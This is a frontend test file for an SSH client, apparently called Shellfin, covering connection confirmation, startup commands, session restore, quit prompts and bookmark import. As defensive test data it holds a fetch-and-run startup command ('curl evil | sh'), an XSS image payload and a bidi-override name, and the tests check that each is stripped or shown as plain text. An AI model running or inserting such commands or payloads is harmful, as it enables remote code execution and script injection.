// Settings-driven flows (ARCHITECTURE §8.11): confirm before connecting, startup command, startup restore, quit confirmation,
// notification texts, default user, remembered passwords, import summary, bookmark dialog fields.
import { act, screen, waitFor, within } from "@testing-library/react";
import { afterEach, describe, expect, it, vi } from "vitest";
import { setLanguage } from "../../i18n";
import { setBackend } from "../../ipc";
import { IpcError } from "../../ipc/call";
import type { Settings } from "../../ipc/types";
import { emptyForm } from "../../lib/bookmarkForm";
import { bookmarkTarget } from "../../lib/targets";
import { useStore } from "../../state/store";
import { settleApp, setupApp } from "../../test/harness";
import { runAction } from "../actions/registry";
import { submitBookmarkForm } from "../hosts/hostActions";
import { notificationTexts, syncNotificationTexts } from "../shell/notificationTexts";
import { resolveQuickConnect } from "../welcome/WelcomeScreen";
import { handleQuitRequested } from "./quitFlow";
import { resetRestoreForTests, restoreBookmarkSessions } from "./restoreSessions";
import { editConnection } from "./editConnection";
import { closeSessionThenReopen, requestOpenSession } from "./sessionActions";
import { disposeAllTerminals } from "../terminal/terminalRegistry";

afterEach(async () => {
  await settleApp(60);
  disposeAllTerminals();
  resetRestoreForTests();
  setBackend(null);
  vi.restoreAllMocks();
});

function patchBookmark(id: string, patch: Partial<NonNullable<ReturnType<typeof useStore.getState>["bookmarks"]>["bookmarks"][number]>): void {
  const dto = useStore.getState().bookmarks;
  if (!dto) throw new Error("no bookmarks");
  act(() => useStore.getState().setBookmarks({ ...dto, bookmarks: dto.bookmarks.map((b) => (b.id === id ? { ...b, ...patch } : b)) }));
}

function patchSettings(patch: (s: Settings) => Settings): void {
  const settings = useStore.getState().settings;
  if (!settings) throw new Error("no settings");
  act(() => useStore.getState().setSettings(patch(settings)));
}

function firstBookmark() {
  const b = useStore.getState().bookmarks?.bookmarks[0];
  if (!b) throw new Error("no bookmark");
  return b;
}

const sessionCount = () => useStore.getState().sessionOrder.length;

describe("confirm before connecting", () => {
  it("asks before a user-initiated connect; Cancel does not connect", async () => {
    const { user } = setupApp();
    const b = firstBookmark();
    patchBookmark(b.id, { confirmConnect: true });
    const pending = requestOpenSession(bookmarkTarget(b.id), b.name);
    const dialog = await screen.findByRole("alertdialog", { name: `Connect to ${b.name}?` });
    await user.click(within(dialog).getByRole("button", { name: "Cancel" }));
    await expect(pending).resolves.toBeNull();
    expect(sessionCount()).toBe(0);
    expect(screen.queryByRole("alertdialog")).toBeNull();
  });

  it("Connect opens the session", async () => {
    const { user } = setupApp();
    const b = firstBookmark();
    patchBookmark(b.id, { confirmConnect: true });
    const pending = requestOpenSession(bookmarkTarget(b.id), b.name);
    await user.click(within(await screen.findByRole("alertdialog")).getByRole("button", { name: "Connect" }));
    await expect(pending).resolves.toEqual(expect.any(String));
    expect(sessionCount()).toBe(1);
  });

  it("asks nothing for bookmarks without the flag, and nothing again for an already open connection", async () => {
    setupApp();
    const b = firstBookmark();
    await requestOpenSession(bookmarkTarget(b.id), b.name);
    expect(sessionCount()).toBe(1);
    expect(screen.queryByRole("alertdialog")).toBeNull();
    patchBookmark(b.id, { confirmConnect: true });
    const again = await requestOpenSession(bookmarkTarget(b.id), b.name); // just activates the open tab
    expect(again).toEqual(expect.any(String));
    expect(screen.queryByRole("alertdialog")).toBeNull();
    expect(sessionCount()).toBe(1);
  });

  it("a deliberate second connection (new tab) asks again", async () => {
    const { user } = setupApp();
    const b = firstBookmark();
    await requestOpenSession(bookmarkTarget(b.id), b.name);
    patchBookmark(b.id, { confirmConnect: true });
    const pending = requestOpenSession(bookmarkTarget(b.id), b.name, undefined, { forceNew: true });
    await user.click(within(await screen.findByRole("alertdialog")).getByRole("button", { name: "Connect" }));
    await pending;
    expect(sessionCount()).toBe(2);
  });

  it("reopening after 'reconnect to apply changes' does not ask", async () => {
    setupApp();
    const b = firstBookmark();
    const id = await requestOpenSession(bookmarkTarget(b.id), b.name);
    if (!id) throw new Error("not opened");
    patchBookmark(b.id, { confirmConnect: true });
    await closeSessionThenReopen(id);
    expect(screen.queryByRole("alertdialog")).toBeNull();
    expect(sessionCount()).toBe(1);
  });

  it("a concurrent open of the same target during the reopen joins it (no second session)", async () => {
    const { backend } = setupApp();
    const b = firstBookmark();
    const id = await requestOpenSession(bookmarkTarget(b.id), b.name);
    if (!id) throw new Error("not opened");
    const open = vi.spyOn(backend, "openSession");
    const reopen = closeSessionThenReopen(id);
    await waitFor(() => expect(open).toHaveBeenCalledOnce()); // the reopen is in flight
    const joined = await requestOpenSession(bookmarkTarget(b.id), b.name); // e.g. a sidebar double click
    await reopen;
    expect(open).toHaveBeenCalledOnce();
    expect(sessionCount()).toBe(1);
    expect(useStore.getState().sessionOrder).toEqual([joined]);
  });

  it("an open of the same target while session_close is still pending ends in exactly one session", async () => {
    const { backend } = setupApp();
    const b = firstBookmark();
    const id = await requestOpenSession(bookmarkTarget(b.id), b.name);
    if (!id) throw new Error("not opened");
    let release: () => void = () => {};
    const gate = new Promise<void>((resolve) => {
      release = resolve;
    });
    const realClose = backend.sessionClose.bind(backend);
    vi.spyOn(backend, "sessionClose").mockImplementation(async (...args) => {
      await gate;
      return realClose(...args);
    });
    const reopen = closeSessionThenReopen(id);
    expect(sessionCount()).toBe(0); // removed from the store, the backend close is pending
    const sidebar = requestOpenSession(bookmarkTarget(b.id), b.name); // e.g. a sidebar double click
    release();
    const [reopened, opened] = await Promise.all([reopen, sidebar]);
    expect(reopened).toBeUndefined();
    expect(sessionCount()).toBe(1);
    expect(useStore.getState().sessionOrder).toEqual([opened]);
  });

  it("a surviving duplicate tab is not taken for the reopened connection", async () => {
    setupApp();
    const b = firstBookmark();
    const first = await requestOpenSession(bookmarkTarget(b.id), b.name);
    const second = await requestOpenSession(bookmarkTarget(b.id), b.name, undefined, { forceNew: true });
    if (!first || !second) throw new Error("not opened");
    await closeSessionThenReopen(first);
    const order = useStore.getState().sessionOrder;
    expect(order).toHaveLength(2);
    expect(order).toContain(second);
    expect(order).not.toContain(first);
  });

  it("the quick-connect box asks for a bookmark typed by name", async () => {
    const { user } = setupApp();
    const b = firstBookmark();
    patchBookmark(b.id, { confirmConnect: true });
    const box = screen.getByRole("textbox", { name: /quick connect/i });
    await user.type(box, `${b.name}{Enter}`);
    await screen.findByRole("alertdialog", { name: `Connect to ${b.name}?` });
    expect(sessionCount()).toBe(0);
  });

  it("the bookmark dialog has the field, labelled exactly 'Confirm before connecting', and saves it", async () => {
    const { user, backend } = setupApp();
    const save = vi.spyOn(backend, "bookmarkSave");
    await user.click(screen.getByRole("button", { name: "Add bookmark" }));
    const dialog = await screen.findByRole("dialog", { name: "New connection" });
    await user.type(within(dialog).getByLabelText("Host", { selector: "input" }), "prod.example.com");
    await user.click(within(dialog).getByRole("checkbox", { name: "Confirm before connecting" }));
    await user.click(within(dialog).getByRole("button", { name: "Save" }));
    await waitFor(() => expect(save).toHaveBeenCalledOnce());
    expect(save.mock.calls[0]?.[0]).toMatchObject({ confirmConnect: true });
    expect(useStore.getState().bookmarks?.bookmarks.find((x) => x.host === "prod.example.com")?.confirmConnect).toBe(true);
  });
});

describe("startup command", () => {
  it("is written once, with Enter, to the first terminal of the connection", async () => {
    const { backend, user } = setupApp();
    const b = firstBookmark();
    patchBookmark(b.id, { startupCommand: "tmux attach || tmux" });
    const write = vi.spyOn(backend, "termWrite");
    const sessionId = await requestOpenSession(bookmarkTarget(b.id), b.name);
    if (!sessionId) throw new Error("not opened");
    await waitFor(() => expect(useStore.getState().workspaces[sessionId]?.terminalTabs).toHaveLength(1), { timeout: 3000 });
    await waitFor(() => expect(write).toHaveBeenCalledOnce());
    const [termId, bytes] = write.mock.calls[0] ?? [];
    expect(termId).toBe(useStore.getState().workspaces[sessionId]?.activeTerminal);
    expect(new TextDecoder().decode(Uint8Array.from(bytes ?? []))).toBe("tmux attach || tmux\r");

    // A second terminal does not get it.
    await user.click(await screen.findByRole("button", { name: "New terminal" }));
    await waitFor(() => expect(useStore.getState().workspaces[sessionId]?.terminalTabs).toHaveLength(2));
    await settleApp(80);
    expect(write).toHaveBeenCalledOnce();
  });

  it("waits for the first terminal when none opens on connect, and is never logged", async () => {
    const { backend } = setupApp();
    const logs = ["log", "info", "warn", "error", "debug"].map((m) => vi.spyOn(console, m as "log").mockImplementation(() => undefined));
    patchSettings((s) => ({ ...s, terminal: { ...s.terminal, openTerminalOnConnect: false } }));
    const b = firstBookmark();
    patchBookmark(b.id, { startupCommand: "echo secret-token-123" });
    const write = vi.spyOn(backend, "termWrite");
    const sessionId = await requestOpenSession(bookmarkTarget(b.id), b.name);
    if (!sessionId) throw new Error("not opened");
    await waitFor(() => expect(useStore.getState().sessionsById[sessionId]?.state.phase).toBe("connected"));
    await settleApp(80);
    expect(write).not.toHaveBeenCalled();
    await act(async () => {
      const { openTerminalTab } = await import("../terminal/terminalActions");
      await openTerminalTab(sessionId);
    });
    await waitFor(() => expect(write).toHaveBeenCalledOnce());
    for (const spy of logs) {
      for (const call of spy.mock.calls) expect(JSON.stringify(call)).not.toContain("secret-token-123");
    }
  });

  it("is not sent for a connection without one", async () => {
    const { backend } = setupApp();
    const write = vi.spyOn(backend, "termWrite");
    const b = firstBookmark();
    const sessionId = await requestOpenSession(bookmarkTarget(b.id), b.name);
    if (!sessionId) throw new Error("not opened");
    await waitFor(() => expect(useStore.getState().workspaces[sessionId]?.terminalTabs).toHaveLength(1), { timeout: 3000 });
    await settleApp(80);
    expect(write).not.toHaveBeenCalled();
  });

  it("the bookmark dialog saves startup command and notes, and shows them again when editing", async () => {
    const { user, backend } = setupApp();
    const save = vi.spyOn(backend, "bookmarkSave");
    await user.click(screen.getByRole("button", { name: "Add bookmark" }));
    const dialog = await screen.findByRole("dialog", { name: "New connection" });
    await user.type(within(dialog).getByLabelText("Host", { selector: "input" }), "n.example.com");
    await user.type(within(dialog).getByLabelText("Startup command", { selector: "input" }), "cd /srv/app");
    await user.type(within(dialog).getByLabelText("Notes"), "line one");
    await user.click(within(dialog).getByRole("button", { name: "Save" }));
    await waitFor(() => expect(save).toHaveBeenCalledOnce());
    expect(save.mock.calls[0]?.[0]).toMatchObject({ startupCommand: "cd /srv/app", notes: "line one" });
    const saved = useStore.getState().bookmarks?.bookmarks.find((x) => x.host === "n.example.com");
    expect(saved).toMatchObject({ startupCommand: "cd /srv/app", notes: "line one" });
  });

  it("the bookmark dialog refuses a multi-line command and over-long notes", async () => {
    const { user, backend } = setupApp();
    const save = vi.spyOn(backend, "bookmarkSave");
    await user.click(screen.getByRole("button", { name: "Add bookmark" }));
    const dialog = await screen.findByRole("dialog", { name: "New connection" });
    await user.type(within(dialog).getByLabelText("Host", { selector: "input" }), "n.example.com");
    // An <input> cannot hold a newline, but a pasted tab survives: control characters are refused.
    const command = within(dialog).getByLabelText("Startup command", { selector: "input" });
    await user.click(command);
    await user.paste("ls\tgrep x");
    await user.click(within(dialog).getByRole("button", { name: "Save" }));
    expect(within(dialog).getByText(/Use a single line of at most 1024 characters/)).toBeTruthy();
    expect(save).not.toHaveBeenCalled();
  });

  it("notes are plain text: markup is shown as typed, not interpreted", async () => {
    setupApp();
    const b = firstBookmark();
    patchBookmark(b.id, { notes: "<img src=x onerror=alert(1)> **bold**" });
    act(() => useStore.getState().openDialog({ kind: "bookmark", bookmarkId: b.id }));
    const dialog = await screen.findByRole("dialog", { name: "Edit bookmark" });
    expect((within(dialog).getByLabelText("Notes") as HTMLTextAreaElement).value).toBe("<img src=x onerror=alert(1)> **bold**");
    expect(dialog.querySelector("img")).toBeNull();
  });
});

describe("startup restore", () => {
  it("reopens the listed bookmarks once, asking for the ones that confirm", async () => {
    const { user } = setupApp();
    const all = useStore.getState().bookmarks?.bookmarks ?? [];
    const [first, second] = all;
    if (!first || !second) throw new Error("need two bookmarks");
    patchBookmark(second.id, { confirmConnect: true });
    const done = restoreBookmarkSessions([first.id, second.id, "gone-id"]);
    const dialog = await screen.findByRole("alertdialog", { name: `Connect to ${second.name}?` });
    expect(sessionCount()).toBe(1); // the first one is already open
    await user.click(within(dialog).getByRole("button", { name: "Connect" }));
    await done;
    expect(sessionCount()).toBe(2);
    // a webview reload gets the same list again: nothing is opened twice
    await restoreBookmarkSessions([first.id, second.id]);
    expect(sessionCount()).toBe(2);
  });

  it("a declined bookmark is skipped and the next one still opens", async () => {
    const { user } = setupApp();
    const [first, second] = useStore.getState().bookmarks?.bookmarks ?? [];
    if (!first || !second) throw new Error("need two bookmarks");
    patchBookmark(first.id, { confirmConnect: true });
    const done = restoreBookmarkSessions([first.id, second.id]);
    await user.click(within(await screen.findByRole("alertdialog")).getByRole("button", { name: "Cancel" }));
    await done;
    expect(sessionCount()).toBe(1);
    expect(Object.values(useStore.getState().sessionsById)[0]?.label).toBe(second.name);
  });

  it("a question replaced by another dialog counts as declined, so the restore goes on", async () => {
    setupApp();
    const [first, second] = useStore.getState().bookmarks?.bookmarks ?? [];
    if (!first || !second) throw new Error("need two bookmarks");
    patchBookmark(first.id, { confirmConnect: true });
    const done = restoreBookmarkSessions([first.id, second.id]);
    await screen.findByRole("alertdialog", { name: `Connect to ${first.name}?` });
    act(() => useStore.getState().openDialog({ kind: "settings" }));
    await done;
    expect(sessionCount()).toBe(1);
    expect(Object.values(useStore.getState().sessionsById)[0]?.label).toBe(second.name);
    expect(useStore.getState().dialog?.kind).toBe("settings");
  });

  it("the mock backend offers the list only with onStartup = restore", async () => {
    const { backend } = setupApp();
    const b = firstBookmark();
    backend.openAtQuit = [b.id, "gone-id"];
    expect((await backend.appFrontendReady()).restoreBookmarkIds).toEqual([]);
    const settings = await backend.settingsGet();
    await backend.settingsUpdate({ ...settings, general: { ...settings.general, onStartup: "restore" } });
    expect((await backend.appFrontendReady()).restoreBookmarkIds).toEqual([b.id]);
  });
});

describe("quit confirmation", () => {
  const quitState = () => ({ dialog: useStore.getState().dialog, quit: useStore.getState().quit });

  it("withConnections (default): quits at once with no connection, asks with one", async () => {
    const { backend } = setupApp();
    const quit = vi.spyOn(backend, "appQuit");
    await handleQuitRequested();
    expect(quit).toHaveBeenCalledOnce();
    expect(quitState().dialog).toBeNull();

    const b = firstBookmark();
    await requestOpenSession(bookmarkTarget(b.id), b.name);
    await waitFor(() => expect(Object.values(useStore.getState().sessionsById)[0]?.state.phase).toBe("connected"));
    quit.mockClear();
    await act(async () => handleQuitRequested());
    expect(quit).not.toHaveBeenCalled();
    expect(quitState().dialog).toEqual({ kind: "quit" });
  });

  it("always: asks even with nothing open; the dialog says what happens", async () => {
    const { backend, user } = setupApp();
    patchSettings((s) => ({ ...s, general: { ...s.general, confirmQuit: "always" } }));
    const quit = vi.spyOn(backend, "appQuit");
    await act(async () => handleQuitRequested());
    const dialog = await screen.findByRole("alertdialog", { name: "Quit Shellfin?" });
    expect(within(dialog).getByText("Shellfin will close.")).toBeTruthy();
    expect(quit).not.toHaveBeenCalled();
    await user.click(within(dialog).getByRole("button", { name: "Quit" }));
    await waitFor(() => expect(quit).toHaveBeenCalledOnce());
  });

  it("withConnections: names the open connections", async () => {
    const { backend } = setupApp();
    const b = firstBookmark();
    await requestOpenSession(bookmarkTarget(b.id), b.name);
    await waitFor(() => expect(Object.values(useStore.getState().sessionsById)[0]?.state.phase).toBe("connected"));
    vi.spyOn(backend, "appQuit");
    await act(async () => handleQuitRequested());
    const dialog = await screen.findByRole("alertdialog");
    expect(dialog.textContent).toMatch(/1 connection is open|A terminal is still running/);
  });

  it("never: quits at once even with connections, but unsaved editor changes still ask", async () => {
    const { backend } = setupApp();
    patchSettings((s) => ({ ...s, general: { ...s.general, confirmQuit: "never" } }));
    const b = firstBookmark();
    const sessionId = await requestOpenSession(bookmarkTarget(b.id), b.name);
    if (!sessionId) throw new Error("not opened");
    await waitFor(() => expect(useStore.getState().sessionsById[sessionId]?.state.phase).toBe("connected"));
    const quit = vi.spyOn(backend, "appQuit");
    await act(async () => handleQuitRequested());
    expect(quit).toHaveBeenCalledOnce();

    quit.mockClear();
    act(() =>
      useStore.getState().addBuffer({
        id: `${sessionId}:/x`,
        sessionId,
        path: "/x",
        load: "ready",
        dirty: true,
      }),
    );
    await act(async () => handleQuitRequested());
    expect(quit).not.toHaveBeenCalled();
    expect(useStore.getState().dialog).toEqual({ kind: "quit" });
  });
});

describe("notification texts", () => {
  it("are sent translated, with the backend placeholders untouched", async () => {
    const { backend } = setupApp();
    await syncNotificationTexts();
    expect(backend.notificationTexts).toEqual({
      connectionLostTitle: "Connection lost",
      connectionLostBody: "The connection to {{name}} was lost.",
      transfersDoneTitle: "Transfers finished",
      transferDoneBody: "Transfer finished: {{name}}",
      transfersDoneBody: "Transfers finished: {{count}}",
    });
  });

  it("follow the UI language and respect the 200 character limit", async () => {
    const { backend } = setupApp();
    await setLanguage("uk");
    try {
      await syncNotificationTexts();
      expect(backend.notificationTexts?.connectionLostTitle).toBe("З'єднання розірвано");
      expect(backend.notificationTexts?.connectionLostBody).toContain("{{name}}");
      expect(backend.notificationTexts?.transfersDoneBody).toContain("{{count}}");
      for (const text of Object.values(notificationTexts())) {
        expect(text.length).toBeGreaterThan(0);
        expect(text.length).toBeLessThanOrEqual(200);
      }
    } finally {
      await setLanguage("en");
    }
  });

  it("a failing command leaves the English fallback in place without an error", async () => {
    const { backend } = setupApp();
    vi.spyOn(backend, "notificationsSetTexts").mockRejectedValue(new IpcError({ code: "invalidArgument", params: { field: "texts.x" } }));
    await expect(syncNotificationTexts()).resolves.toBeUndefined();
  });
});

describe("default user", () => {
  it("is added to a quick-connect target that names no user", () => {
    expect(resolveQuickConnect("host.example.com", [], [], "deploy")?.target).toEqual({ kind: "quick", spec: "deploy@host.example.com" });
    expect(resolveQuickConnect("root@host.example.com", [], [], "deploy")?.target).toEqual({ kind: "quick", spec: "root@host.example.com" });
    expect(resolveQuickConnect("host.example.com", [], [], "")?.target).toEqual({ kind: "quick", spec: "host.example.com" });
    // names of bookmarks and ssh-config hosts are never rewritten
    expect(resolveQuickConnect("bastion", ["bastion"], [], "deploy")?.target).toEqual({ kind: "sshConfig", alias: "bastion" });
  });

  it("prefills a new bookmark in the dialog", async () => {
    const { user } = setupApp();
    patchSettings((s) => ({ ...s, connection: { ...s.connection, defaultUser: "deploy" } }));
    await user.click(screen.getByRole("button", { name: "Add bookmark" }));
    const dialog = await screen.findByRole("dialog", { name: "New connection" });
    expect((within(dialog).getByLabelText("User", { selector: "input" }) as HTMLInputElement).value).toBe("deploy");
  });

  it("does not override the User of an ssh-config host copied into a bookmark", async () => {
    setupApp();
    patchSettings((s) => ({ ...s, connection: { ...s.connection, defaultUser: "deploy" } }));
    act(() => useStore.getState().addSession("cfg1", { kind: "sshConfig", alias: "prod-web-01" }, "prod-web-01"));
    act(() => editConnection("cfg1"));
    const dialog = await screen.findByRole("dialog", { name: "New connection" });
    expect((within(dialog).getByLabelText("User", { selector: "input" }) as HTMLInputElement).value).toBe("");
    expect((within(dialog).getByLabelText("Host", { selector: "input" }) as HTMLInputElement).value).toBe("prod-web-01");
  });

  it("the quick-connect box uses it", async () => {
    const { user } = setupApp();
    patchSettings((s) => ({ ...s, connection: { ...s.connection, defaultUser: "deploy" } }));
    await user.type(screen.getByRole("textbox", { name: /quick connect/i }), "box.example.com{Enter}");
    await waitFor(() => expect(sessionCount()).toBe(1));
    expect(Object.values(useStore.getState().sessionsById)[0]?.target).toEqual({ kind: "quick", spec: "deploy@box.example.com" });
  });
});

describe("read ~/.ssh/config", () => {
  it("on (default): the ssh-config group lists its hosts", () => {
    setupApp();
    expect(screen.getByRole("button", { name: /Connect to prod-web-01/ })).toBeTruthy();
  });

  it("off: the group is hidden, also before the backend's empty snapshot arrives", () => {
    setupApp();
    patchSettings((s) => ({ ...s, connection: { ...s.connection, readSshConfig: false } }));
    expect(screen.queryByRole("button", { name: /Connect to prod-web-01/ })).toBeNull();
    // the bookmarks stay
    expect(screen.getByRole("button", { name: `Connect to ${firstBookmark().name}` })).toBeTruthy();
  });

  it("the mock backend publishes an empty snapshot when the setting is turned off, and the full one when it is back on", async () => {
    const { backend } = setupApp();
    const seen: number[] = [];
    await backend.listen("ssh-config:changed", (snapshot) => seen.push(snapshot.hosts.length));
    const settings = await backend.settingsGet();
    await backend.settingsUpdate({ ...settings, connection: { ...settings.connection, readSshConfig: false } });
    expect((await backend.sshConfigReload()).hosts).toEqual([]);
    await backend.settingsUpdate({ ...settings, connection: { ...settings.connection, readSshConfig: true } });
    expect(seen).toEqual([0, 5]);
  });
});

describe("remembered passwords", () => {
  const passwordForm = () => ({ ...emptyForm(), host: "pw.example.com", name: "pw", auth: "password" as const, password: "s3cret", savePassword: true });

  it("on: a typed password is stored in the keychain", async () => {
    const { backend } = setupApp();
    const set = vi.spyOn(backend, "bookmarkSetPassword");
    await submitBookmarkForm(passwordForm(), { editing: null, intent: "save" });
    expect(set).toHaveBeenCalledWith(expect.any(String), "s3cret");
  });

  it("off: the password is never stored, the bookmark is saved, the connection still gets the password", async () => {
    const { backend } = setupApp();
    patchSettings((s) => ({ ...s, connection: { ...s.connection, rememberPasswords: false } }));
    const set = vi.spyOn(backend, "bookmarkSetPassword");
    const open = vi.spyOn(backend, "openSession");
    await submitBookmarkForm(passwordForm(), { editing: null, intent: "connect" });
    expect(set).not.toHaveBeenCalled();
    expect(useStore.getState().bookmarks?.bookmarks.some((b) => b.host === "pw.example.com")).toBe(true);
    expect(open.mock.calls[0]?.[0].target).toMatchObject({ kind: "draft", password: "s3cret" });
  });

  it("a refusal with secretStorageDisabled does not fail the save", async () => {
    const { backend } = setupApp();
    vi.spyOn(backend, "bookmarkSetPassword").mockRejectedValue(new IpcError({ code: "secretStorageDisabled" }));
    await expect(submitBookmarkForm(passwordForm(), { editing: null, intent: "save" })).resolves.toBeUndefined();
    expect(useStore.getState().bookmarks?.bookmarks.some((b) => b.host === "pw.example.com")).toBe(true);
  });

  it("another error is still reported", async () => {
    const { backend } = setupApp();
    vi.spyOn(backend, "bookmarkSetPassword").mockRejectedValue(new IpcError({ code: "internal" }));
    await expect(submitBookmarkForm(passwordForm(), { editing: null, intent: "save" })).rejects.toBeDefined();
  });

  it("off: the dialog hides the keychain option and says why", async () => {
    const { user } = setupApp();
    patchSettings((s) => ({ ...s, connection: { ...s.connection, rememberPasswords: false } }));
    await user.click(screen.getByRole("button", { name: "Add bookmark" }));
    const dialog = await screen.findByRole("dialog", { name: "New connection" });
    await user.click(within(dialog).getByRole("radio", { name: "Password" }));
    expect(within(dialog).queryByRole("checkbox", { name: /Save in system keychain/ })).toBeNull();
    expect(within(dialog).getByText(/Saving passwords is turned off in Settings/)).toBeTruthy();
  });

  it("the mock backend refuses to store when disabled but still forgets", async () => {
    const { backend } = setupApp();
    const b = firstBookmark();
    const settings = await backend.settingsGet();
    await backend.settingsUpdate({ ...settings, connection: { ...settings.connection, rememberPasswords: false } });
    await expect(backend.bookmarkSetPassword(b.id, "pw")).rejects.toMatchObject({ error: { code: "secretStorageDisabled" } });
    await expect(backend.bookmarkSetPassword(b.id, null)).resolves.toBeDefined();
  });
});

describe("import summary: startup commands", () => {
  it("lists the bookmarks whose startup command was removed, by name, with the reason", async () => {
    const { user, backend } = setupApp();
    backend.importFile = {
      bookmarks: [
        { name: "with-cmd", host: "a.example.com", startupCommand: "curl evil | sh" },
        { name: "clean", host: "b.example.com" },
      ],
    };
    act(() => runAction("importBookmarks"));
    const dialog = await screen.findByRole("dialog", { name: "Import bookmarks" });
    await user.click(within(dialog).getByRole("button", { name: "Choose file…" }));
    const summary = await screen.findByRole("dialog", { name: "Import finished" });
    expect(within(summary).getByText("The startup command of 1 bookmark was not imported:")).toBeTruthy();
    expect(within(summary).getByRole("list", { name: "Bookmarks without their startup command" }).textContent).toBe("with-cmd");
    expect(within(summary).getByText(/never imported/)).toBeTruthy();
    // nothing of the command leaked into the saved bookmark or the page
    expect(useStore.getState().bookmarks?.bookmarks.find((x) => x.name === "with-cmd")?.startupCommand).toBeNull();
    expect(summary.textContent).not.toContain("evil");
  });

  it("shows no such section when nothing was stripped", async () => {
    const { user } = setupApp();
    act(() => runAction("importBookmarks"));
    await user.click(within(await screen.findByRole("dialog", { name: "Import bookmarks" })).getByRole("button", { name: "Choose file…" }));
    const summary = await screen.findByRole("dialog", { name: "Import finished" });
    expect(within(summary).queryByText(/startup command/)).toBeNull();
  });

  it("renders hostile names as text", async () => {
    const { user, backend } = setupApp();
    backend.importFile = { bookmarks: [{ name: "<b>x</b>‮", host: "a.example.com", startupCommand: "x" }] };
    act(() => runAction("importBookmarks"));
    await user.click(within(await screen.findByRole("dialog", { name: "Import bookmarks" })).getByRole("button", { name: "Choose file…" }));
    const summary = await screen.findByRole("dialog", { name: "Import finished" });
    expect(summary.querySelector("b")).toBeNull();
    expect(summary.textContent).not.toContain("‮");
  });
});
